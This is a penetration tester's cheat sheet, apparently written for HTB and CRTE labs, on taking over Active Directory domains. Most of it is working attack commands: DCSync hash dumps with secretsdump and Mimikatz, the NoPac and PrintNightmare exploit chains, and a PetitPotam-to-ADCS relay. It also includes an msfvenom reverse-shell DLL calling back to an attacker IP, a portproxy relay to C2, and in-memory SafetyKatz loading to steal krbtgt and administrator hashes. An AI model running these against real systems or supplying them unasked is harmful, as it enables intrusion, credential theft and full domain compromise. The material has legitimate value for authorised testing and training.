# DCSync & Domain Takeover Attacks

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

## DCSync — Replicate Domain Hashes Without Touching NTDS.dit

### DCSync via Impacket (Linux — requires DS-Replication-Get-Changes-All) [added: 2026-04]
- **Tags:** #DCSync #secretsdump #Impacket #DomainReplication #LinuxAD #DomainHashes #T1003.006
- **Trigger:** Compromised account confirmed to have DS-Replication-Get-Changes + Get-Changes-All rights (or is DA)
- **Prereq:** Account with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights, impacket-secretsdump available
- **Yields:** Full domain hash dump (all user NTLM hashes), or targeted single-user hash (e.g., krbtgt for Golden Ticket)
- **Opsec:** Med
- **Context:** Compromised account has `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` rights (or is Domain Admin)
- **Payload/Method:**
  ```bash
  # Full domain hash dump
  secretsdump.py -outputfile domain_hashes -just-dc DOMAIN/adunn@172.16.5.5

  # Single user (krbtgt for Golden Ticket)
  secretsdump.py -just-dc-user DOMAIN/krbtgt DOMAIN/adunn@172.16.5.5

  # Using VSS for stealthier extraction
  secretsdump.py -outputfile domain_hashes -just-dc DOMAIN/adunn@172.16.5.5 -use-vss

  # With captured hash (pass-the-hash style)
  secretsdump.py -just-dc-user DOMAIN/administrator "DC01$"@172.16.5.5 \
    -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
  ```

### DCSync via Mimikatz (Windows) [added: 2026-04]
- **Tags:** #DCSync #Mimikatz #lsadump #DomainReplication #WindowsDCSync #DomainHashes #T1003.006
- **Trigger:** On a Windows host with Mimikatz and account having replication rights
- **Prereq:** Mimikatz on host, account with DS-Replication rights or DA, SeDebugPrivilege
- **Yields:** NTLM hash and Kerberos keys for targeted domain user
- **Opsec:** Med
- **Context:** On-box Mimikatz with replication rights
- **Payload/Method:**
  ```
  mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator
  mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt
  ```

### Check DCSync Rights for a User [added: 2026-04]
- **Tags:** #DCSync #ACLCheck #ReplicationRights #PowerView #GetObjectAcl #Verification #T1003.006
- **Trigger:** Need to verify if a compromised account has DCSync rights before attempting the attack
- **Prereq:** Valid domain credentials, PowerView loaded, target user SID known
- **Yields:** Confirmation of whether user has DS-Replication-Get-Changes and Get-Changes-All rights
- **Opsec:** Low
- **Context:** Verify if compromised account has replication rights before attempting
- **Payload/Method:**
  ```powershell
  $sid = "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX"
  Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | `
    ? { ($_.ObjectAceType -match 'Replication-Get') } | `
    ?{$_.SecurityIdentifier -match $sid} | `
    select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType
  ```

## NoPac / Sam_The_Admin (CVE-2021-42278/42287) — Low-Priv → SYSTEM on DC

### NoPac Full Chain [added: 2026-04]
- **Tags:** #NoPac #CVE202142278 #CVE202142287 #SamTheAdmin #MachineAccountQuota #DomainTakeover #T1068
- **Trigger:** Any valid domain credentials on unpatched DC (pre-Nov 2021); machine account quota > 0
- **Prereq:** Valid domain credentials, unpatched DC (CVE-2021-42278/42287), MachineAccountQuota > 0, noPac.py
- **Yields:** SYSTEM shell on DC or DCSync via machine account impersonation
- **Opsec:** High
- **Context:** Any valid domain credentials + unpatched DC (pre-Nov 2021) — machine account quota > 0
- **Payload/Method:**
  ```bash
  # Check if vulnerable
  sudo python3 scanner.py DOMAIN.LOCAL/user:password -dc-ip 172.16.5.5 -use-ldap

  # Get SYSTEM shell
  sudo python3 noPac.py DOMAIN.LOCAL/user:password \
    -dc-ip 172.16.5.5 -dc-host DC01 \
    -shell --impersonate administrator -use-ldap

  # DCSync via noPac (no shell needed)
  sudo python3 noPac.py DOMAIN.LOCAL/user:password \
    -dc-ip 172.16.5.5 -dc-host DC01 \
    --impersonate administrator -use-ldap \
    -dump -just-dc-user DOMAIN/administrator
  ```

## PrintNightmare (CVE-2021-1675 / MS-RPRN) — RCE as SYSTEM via Print Spooler

### PrintNightmare Full Chain [added: 2026-04]
- **Tags:** #PrintNightmare #CVE20211675 #PrintSpooler #RCE #SYSTEM #msfvenom #T1068
- **Trigger:** Print Spooler service running on DC (rpcdump shows MS-RPRN/MS-PAR); any authenticated user
- **Prereq:** Authenticated domain user, Print Spooler running on target, SMB share for DLL hosting, msfvenom
- **Yields:** SYSTEM-level code execution on target (reverse shell or arbitrary command)
- **Opsec:** High
- **Context:** Print Spooler service running on DC (default on older DCs) — any authenticated user can exploit
- **Payload/Method:**
  ```bash
  # Check if MS-PAR/MS-RPRN exposed
  rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

  # Generate reverse shell DLL
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=8080 \
    -f dll > backupscript.dll

  # Host DLL via SMB
  sudo smbserver.py -smb2support CompData /path/to/

  # Exploit (cube0x0 version requires his impacket fork)
  pip3 uninstall impacket
  git clone https://github.com/cube0x0/impacket && cd impacket && python3 setup.py install

  sudo python3 CVE-2021-1675.py DOMAIN.LOCAL/user:password@172.16.5.5 \
    '\\<attacker-ip>\CompData\backupscript.dll'
  ```

## PetitPotam → ADCS ESC8 → DCSync Chain

### PetitPotam + NTLM Relay to ADCS → Certificate → DC Hash [added: 2026-04]
- **Tags:** #PetitPotam #ESC8 #NTLMRelay #ADCS #Coercion #DCSync #PKINITtools #T1557.001
- **Trigger:** ADCS web enrollment enabled with NTLM auth; DC unpatched for PetitPotam; coercion possible
- **Prereq:** ADCS with HTTP enrollment, ntlmrelayx, PetitPotam.py, PKINITtools for cert-to-hash conversion
- **Yields:** DC machine account NT hash via certificate chain, enabling full DCSync
- **Opsec:** High
- **Context:** ADCS web enrollment enabled with NTLM auth, DC not patched — coerce DC to authenticate to attacker → relay to ADCS → get DC certificate → use for DCSync
- **Payload/Method:**
  ```bash
  # Step 1: Start NTLM relay to ADCS web enrollment
  sudo ntlmrelayx.py -debug -smb2support \
    --target http://CA01.DOMAIN.LOCAL/certsrv/certfnsh.asp \
    --adcs --template DomainController

  # Step 2: Trigger PetitPotam coercion (in separate terminal)
  git clone https://github.com/topotam/PetitPotam.git
  python3 PetitPotam.py <attacker-ip> <dc-ip>
  # ntlmrelayx intercepts DC auth → issues certificate → outputs base64 PFX

  # Step 3: Request TGT using certificate
  # NOTE: PKINITtools not found in ptTools — install to $HOME/Pentester/ptTools/ if needed
  python3 $HOME/Pentester/ptTools/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>$ \
    -pfx-base64 <BASE64_PFX> dc01.ccache

  # Step 4: Get DC NTLM hash from TGT
  export KRB5CCNAME=dc01.ccache
  python3 $HOME/Pentester/ptTools/PKINITtools/getnthash.py \
    -key <SESSION_KEY> <DOMAIN>/<DC_HOSTNAME>$

  # Step 5: DCSync with DC machine hash
  secretsdump.py -just-dc-user DOMAIN/administrator \
    "DC01$"@172.16.5.5 \
    -hashes aad3c435b514a4eeaad3b935b51304fe:<dc-machine-hash>

  # Alternative Step 5: Pass-the-ticket DCSync
  .\Rubeus.exe asktgt /user:DC01$ /<base64cert>= /ptt
  mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt
  ```

### DCSync via Kerberos Authentication (No Password, Ticket-Based) [added: 2026-04]
- **Tags:** #DCSync #Kerberos #ccache #TicketBased #secretsdump #NoPassword #T1003.006
- **Trigger:** Have a Kerberos ccache/ticket but no plaintext password; need to DCSync using ticket-based auth
- **Prereq:** Valid Kerberos ccache file with appropriate privileges, secretsdump.py available
- **Yields:** Domain user hashes via DCSync using Kerberos authentication (no password needed)
- **Opsec:** Med
- **Context:** Have a Kerberos ccache/ticket but no plaintext password -- use `-k -no-pass` with secretsdump for DCSync
- **Payload/Method:**
  ```bash
  export KRB5CCNAME=dc01.ccache
  secretsdump.py -just-dc-user DOMAIN/administrator -k -no-pass "DC01$"@DC01.DOMAIN.LOCAL
  ```

### Privileged Access Enumeration (RDP/WinRM Groups) [added: 2026-04]
- **Tags:** #RDP #WinRM #RemoteAccess #PrivilegedAccess #LateralMovement #NetLocalGroupMember #T1021
- **Trigger:** Need to identify which users have RDP or WinRM access to specific hosts for lateral movement planning
- **Prereq:** Valid domain credentials, PowerView loaded
- **Yields:** List of users with RDP and WinRM access to target hosts (lateral movement paths)
- **Opsec:** Low
- **Context:** Check which users have remote access (RDP/WinRM) to specific hosts -- identifies lateral movement paths
- **Payload/Method:**
  ```powershell
  Get-NetLocalGroupMember -ComputerName TARGET-HOST -GroupName "Remote Desktop Users"
  Get-NetLocalGroupMember -ComputerName TARGET-HOST -GroupName "Remote Management Users"
  ```

### DCSync via Computer Object with DS-Replication Rights (CRTE Exam Report) [added: 2026-04]
- **Tags:** #DCSync #ComputerObject #DSReplication #BloodHound #netshPortProxy #SafetyKatz #T1003.006
- **Trigger:** BloodHound shows a non-DC computer object with GetChanges/GetChangesAll edges on the domain
- **Prereq:** Local admin on the computer with DCSync rights, Loader.exe and SafetyKatz available, network path to DC
- **Yields:** Domain admin and krbtgt hashes via DCSync from a non-DC computer with replication rights
- **Opsec:** Med
- **Context:** BloodHound reveals a non-DC computer object has `DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All` rights on the domain. Gain local admin on the machine, use `netsh portproxy` to relay C2 HTTP, then run SafetyKatz in-memory.
- **Payload/Method:**
  ```powershell
  # Step 1: Verify DCSync rights in BloodHound (node → Outbound Object Control → GetChanges/GetChangesAll on domain)
  # Step 2: Gain shell on target machine (e.g., via PSRemoting after group membership escalation)
  winrs -r:<TARGET> cmd

  # Step 3: Transfer Loader.exe to target
  # (use SMB share or WinRM copy)

  # Step 4: If target can't reach C2 directly, set up netsh portproxy
  netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<C2_IP>

  # Step 5: DCSync domain administrator and krbtgt hashes in-memory
  c:\programdata\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "privilege::debug" "token::elevate" "lsadump::dcsync /user:<DOMAIN>\administrator" "exit"
  c:\programdata\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "privilege::debug" "token::elevate" "lsadump::dcsync /user:<DOMAIN>\krbtgt" "exit"

  # Step 6: OPtH with retrieved AES256 to access DC
  Loader.exe -path Rubeus.exe -args asktgt /user:administrator /aes256:<KEY> /domain:<DOMAIN> /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt
  winrs -r:<DC_FQDN> cmd
  ```
- **Key insight:** Machine accounts (not just users) can hold DCSync rights. BloodHound's "GetChanges/GetChangesAll" edges on a computer node signal this path.

### DCSync /history — Recover Old Cleartext Passwords [added: 2026-04]
- **Tags:** #DCSync #PasswordHistory #CleartextPassword #Mimikatz #PrimaryCleared #CredentialHunting
- **Trigger:** DCSync access obtained; standard NTLM hash doesn't crack; target user flagged as admin of a specific service (e.g., in BloodHound description field)
- **Prereq:** DCSync rights (DA, domain replication, or constrained delegation to DC); Mimikatz on a Windows host with Kerberos ticket injected
- **Yields:** Historical plaintext passwords stored in `Primary:CLEARTEXT` — appears when reversible encryption was enabled or password was set via LDAP with cleartext. Works even for accounts no longer using reversible encryption if it was set at any point.
- **Opsec:** Med
- **Context:** Some environments (or legacy configs) store passwords with reversible encryption. DCSync `/history` retrieves all historical password entries. The `Primary:CLEARTEXT` field will be populated if reversible encryption was ever enabled for the account. Especially useful for service accounts or admin accounts where the description field hints at a role (e.g., "Administrator of Web Server").
- **Payload/Method:**
  ```
  # In mimikatz (requires active DC$ or DA ticket)
  lsadump::dcsync /user:<domain>\<username> /history

  # Look for:
  # * Primary:CLEARTEXT *
  # <plaintext_password>

  # Then test on other systems (SSH, WinRM, etc.)
  ```
